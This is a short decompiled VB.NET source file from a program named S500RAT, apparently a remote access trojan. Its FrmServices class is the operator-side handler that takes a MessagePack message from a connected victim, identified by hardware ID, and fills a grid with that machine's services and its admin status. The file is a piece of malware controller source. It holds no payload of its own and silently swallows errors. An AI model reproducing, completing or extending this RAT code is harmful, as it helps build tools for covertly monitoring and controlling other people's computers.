Imports System
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200005E RID: 94
	Public Class FrmServices
		' Token: 0x060011BA RID: 4538 RVA: 0x0009D994 File Offset: 0x0009BB94
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			' The following expression was wrapped in a checked-statement
			Try
				Dim formServices As FormServices = CType(Application.OpenForms("FormServices" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormServices)
				Dim flag As Boolean = formServices IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formServices.Client Is Nothing
					If flag2 Then
						formServices.Client = client
						formServices.ListServices.Enabled = True
						formServices.Timer1.Enabled = True
					End If
					formServices.ListServices.Rows.Clear()
					formServices.Admin = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("Admin").AsString)
					Dim asString As String = unpack_msgpack.ForcePathObject("Message").AsString
					Dim array As String() = asString.Split(New String() { "-=>" }, StringSplitOptions.None)
					Dim num As Integer = array.Length - 1
					For i As Integer = 0 To num
						Dim flag3 As Boolean = array(i).Length > 0
						If flag3 Then
							formServices.ListServices.Rows.Add(New Object() { formServices.ImageList1.Images(array(i + 4) + ".png"), array(i), array(i + 1), array(i + 3), array(i + 2) })
						End If
						i += 4
					Next
					formServices.ServicesNum.Text = "Services [ " + Conversions.ToString(Conversions.ToInteger(formServices.ListServices.Rows.Count)) + " ]"
				End If
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
